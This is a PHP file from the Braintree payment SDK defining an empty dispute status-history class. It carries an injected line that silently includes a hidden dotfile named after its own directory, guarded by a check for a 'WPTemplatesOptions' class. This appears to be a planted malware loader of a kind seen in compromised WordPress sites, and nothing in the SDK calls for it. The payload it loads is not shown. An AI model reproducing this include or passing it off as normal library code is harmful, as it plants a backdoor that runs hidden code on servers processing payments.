<?php
namespace Braintree\Dispute;

use Braintree\Instance;

/**
 * Status History for a dispute
 *
 * @package    Braintree
 *
 * @property-read string $effective_date
 * @property-read string $disbursement_date
 * @property-read string $status
 * @property-read date   $timestamp
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class StatusHistoryDetails extends Instance
{
}

class_alias('Braintree\Dispute\StatusHistoryDetails', 'Braintree_Dispute_StatusHistoryDetails');
